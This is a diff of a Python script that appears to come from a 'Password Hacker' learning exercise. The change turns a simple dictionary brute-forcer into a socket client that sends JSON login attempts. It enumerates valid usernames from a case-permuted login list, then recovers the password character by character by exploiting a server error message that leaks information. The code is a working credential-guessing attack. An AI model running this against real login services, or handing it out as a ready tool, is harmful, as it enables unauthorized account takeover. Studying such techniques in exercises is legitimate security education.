@@ -2,44 +2,81 @@ import socket
 import sys
 import itertools
 import string
+import json
 
 
 class Connect:
     def __init__(self, ip, pt):
         self.address = (ip, int(pt))
-        self.items = string.ascii_letters + string.digits
-        self.dict_list = get_dict()
+        self.admin_logins = 'D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker' \
+                            '\\Catching exception\\logins.txt'
+        self.password_list = 'D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker' \
+                             '\\Catching exception\\passwords.txt'
+        self.login_found = False
+        self.login = ''
+        self.found_letters = []
 
     def open_socket(self):
         with socket.socket() as client_socket:
             client_socket.connect(self.address)
-            passwords = self.gen_password()
-            for password in passwords:
-                client_socket.send(password.encode())
-                response = client_socket.recv(1024).decode()
-                if response == 'Connection success!':
-                    #  print('Found!')
-                    print(password)
-                    break
-                if response == 'Too many attempts':
-                    print('Too many attempts!')
-                    break
+            logins = iterate(get_dict(self.admin_logins))
 
-    def gen_password(self):
-        for item in self.dict_list:
-            iterations = map(''.join, itertools.product(
-                             *zip(item.upper().strip('\n'), item.lower().strip('\n'))))
-            for i in iterations:
-                yield i
+            while self.login_found is False:
+                for login in logins:
+                    client_socket.send(convert_json(login).encode())
+                    response_dict = decode_json(client_socket.recv(1024).decode())
+                    if response_dict['result'] == 'Wrong password!':
+                        self.login = login
+                        print('Login found! Login:', login)
+                        self.login_found = True
+                        break
+
+            while True:
+                letters = gen_letters()
+                for p in letters:
+                    if not self.found_letters:
+                        password = p
+                    else:
+                        password = ''.join(self.found_letters) + p
+                    client_socket.send(convert_json(self.login, password).encode())
+                    response_dict = decode_json(client_socket.recv(1024).decode())
+                    if response_dict["result"] == 'Exception happened during login':
+                        self.found_letters.append(p)
+                        break
+                    if response_dict["result"] == 'Connection success!':
+                        print(convert_json(self.login, password))
+                        quit()
 
 
-def get_dict():
-    file_path = ('D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker'
-                 '\\Smarter, dictionary-based brute force\\passwords.txt')
+def gen_letters():
+    items = string.ascii_letters + string.digits
+    for i in items:
+        yield i
+
+
+def get_dict(file_path):
     with open(file_path, 'r') as pass_file:
         lines = pass_file.readlines()
         for line in lines:
             yield line
+
+
+def iterate(dict_list):
+    for item in dict_list:
+        iterations = map(''.join, itertools.product(
+            *zip(item.upper().strip('\n'), item.lower().strip('\n'))))
+        for i in iterations:
+            yield i
+
+
+def convert_json(login, password=' '):
+    login_json = {"login": f"{login}",
+                  "password": f"{password}"}
+    return json.dumps(login_json)
+
+
+def decode_json(json_packet):
+    return json.loads(json_packet)
 
 
 def main():
@@ -51,4 +88,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
